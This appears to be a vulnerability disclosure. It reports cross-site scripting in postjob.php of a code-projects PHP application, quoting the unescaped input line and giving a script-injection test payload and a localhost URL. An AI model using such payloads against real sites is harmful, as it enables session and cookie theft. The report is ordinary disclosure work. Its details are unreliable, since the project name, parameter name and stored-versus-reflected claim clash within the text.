# Responsive Blog Site #

## supplier ##

https://code-projects.org/project-monitoring-system-in-php-with-source-code/

## Vulnerability file ##

postjob.php

## describe ##

The `postjob.php` file contains an unrestricted cross-site scripting (XSS) vulnerability, leading to a stored XSS attack. Malicious attackers can exploit this vulnerability to obtain sensitive information from the client side.

### Code analysis ###

Line 321 in postjob.php

```php
<input name="txtapplyto" type="text" id="txtapplyto" value="<?php if(isset($_POST['txtapplyto']))echo $_POST['txtapplyto']; ?>" />
```

## POC ##
For id parameter, the test payload is `"><script>alert(document.cookie)</script>`
Visit this URL to trigger the cross-site scripting vulnerability.

```
http://127.0.0.1:8083/Job/onlineJobSearchEngine/postjob.php
```

### Rusult ###
![image](https://github.com/asd1238525/cve/blob/main/e46c37d2-a1c4-456c-b8a4-78dd41d2286f.png)
For parameter "txtapplyto":
![image](https://github.com/asd1238525/cve/blob/main/f96aefd3-3583-49d2-9aaa-2fdff0f81243.png)
